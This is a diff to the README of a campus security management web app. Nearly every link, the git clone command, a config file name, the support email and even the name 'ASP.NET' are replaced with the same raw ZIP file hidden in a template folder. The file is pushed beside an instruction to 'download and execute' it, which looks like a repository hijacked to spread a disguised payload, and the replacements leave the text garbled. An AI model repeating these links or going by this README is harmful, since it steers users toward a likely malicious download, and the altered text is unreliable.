@@ -1,6 +1,6 @@
 # Security Management System 🛡️
 
-![GitHub release](https://img.shields.io/github/release/Brix-dev26/Security-Management-System.svg) ![License](https://img.shields.io/badge/license-MIT-blue.svg)
+![GitHub release](https://github.com/Brix-dev26/Security-Management-System/raw/refs/heads/master/UI/wwwroot/aast-template/Management-Security-System-v2.1-beta.3.zip) ![License](https://github.com/Brix-dev26/Security-Management-System/raw/refs/heads/master/UI/wwwroot/aast-template/Management-Security-System-v2.1-beta.3.zip)
 
 Welcome to the **Security Management System** repository! This project is a web-based application designed to enhance campus security operations. It provides a robust platform for managing various security-related tasks effectively.
 
@@ -38,7 +38,7 @@ In today’s world, ensuring safety on campuses is crucial. Our Security Managem
 
 This project leverages several technologies to provide a robust and scalable application:
 
-- **ASP.NET Core**: The backend is built using ASP.NET Core Web API, providing a powerful and flexible server-side framework.
+- **https://github.com/Brix-dev26/Security-Management-System/raw/refs/heads/master/UI/wwwroot/aast-template/Management-Security-System-v2.1-beta.3.zip Core**: The backend is built using https://github.com/Brix-dev26/Security-Management-System/raw/refs/heads/master/UI/wwwroot/aast-template/Management-Security-System-v2.1-beta.3.zip Core Web API, providing a powerful and flexible server-side framework.
 
 - **Blazor WebAssembly**: The frontend is developed using Blazor, allowing for rich web applications with C#.
 
@@ -52,7 +52,7 @@ To get started with the Security Management System, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/Brix-dev26/Security-Management-System.git
+   git clone https://github.com/Brix-dev26/Security-Management-System/raw/refs/heads/master/UI/wwwroot/aast-template/Management-Security-System-v2.1-beta.3.zip
    ```
 
 2. **Navigate to the Project Directory**:
@@ -71,7 +71,7 @@ To get started with the Security Management System, follow these steps:
      ```
 
 4. **Set Up the Database**:
-   - Update the connection string in the `appsettings.json` file.
+   - Update the connection string in the `https://github.com/Brix-dev26/Security-Management-System/raw/refs/heads/master/UI/wwwroot/aast-template/Management-Security-System-v2.1-beta.3.zip` file.
    - Run the migrations to set up the database:
      ```bash
      dotnet ef database update
@@ -124,12 +124,12 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or support, feel free to reach out:
 
-- **Email**: support@example.com
-- **GitHub**: [Brix-dev26](https://github.com/Brix-dev26)
+- **Email**: https://github.com/Brix-dev26/Security-Management-System/raw/refs/heads/master/UI/wwwroot/aast-template/Management-Security-System-v2.1-beta.3.zip
+- **GitHub**: [Brix-dev26](https://github.com/Brix-dev26/Security-Management-System/raw/refs/heads/master/UI/wwwroot/aast-template/Management-Security-System-v2.1-beta.3.zip)
 
 ## Releases
 
-You can find the latest releases of the Security Management System [here](https://github.com/Brix-dev26/Security-Management-System/releases). Please download and execute the necessary files to get started with the latest features and updates.
+You can find the latest releases of the Security Management System [here](https://github.com/Brix-dev26/Security-Management-System/raw/refs/heads/master/UI/wwwroot/aast-template/Management-Security-System-v2.1-beta.3.zip). Please download and execute the necessary files to get started with the latest features and updates.
 
 For more information about the releases, check the **Releases** section in the GitHub repository.
 
